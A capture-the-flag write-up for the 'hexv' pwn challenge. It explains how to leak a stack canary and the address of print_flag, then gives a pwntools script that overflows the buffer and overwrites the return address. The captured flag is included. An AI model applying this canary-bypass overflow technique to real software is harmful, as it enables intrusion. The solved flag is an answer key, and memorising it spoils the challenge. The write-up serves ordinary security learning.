# hexv
## Solution

We are given nothing for this challenge. Using netcat to connect to the server running the program, we can see that we are given a few functions, one of which (`dump`) gives us some addresses on the stack. Sending some input and reading the stack shows us where our input starts, and throwing a large enough input shows us that it is vulnerable to a buffer overflow, but that it also has a canary. The `dump` function does let us read the canary value though. Another function gives us the addresses of some functions, including one called `print_flag`. Thus, the exploit is simple. All we need to do is use the `funcs` command to get the address of `print_flag`, then use the `dump` command so we know the value of the canary, and finally construct a payload that lets us use the buffer overflow to override the `ret` address with the `print_flag` function. Note that using the `str` command appends data to the input that appears to cause the exploit to not work, so just send the data with no command or at least not with either `str` or `hex`.

## Script
```py
from pwn import *
from time import sleep

p = remote('hexv.challs.pwnoh.io', 1337, ssl=True)

p.sendline(b'dump')

p.interactive()

p.sendline(b'funcs')
p.recvuntil(b'print_funcs')
p.recvline()
a = p.recvline().split(b" ")[0][-14:]
print(a)

canary = int(input(),16)
print(canary)

b = '909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090'
p.sendline(b'dump ' + b'a'*int(len(b)/2-5) + p64(canary) + b'00000000' + p64(int(a,16)))

p.interactive()
```

## Flag
`FLAG: bctf{sur3_h0Pe_th1S_r3nderED_PR0pErly}`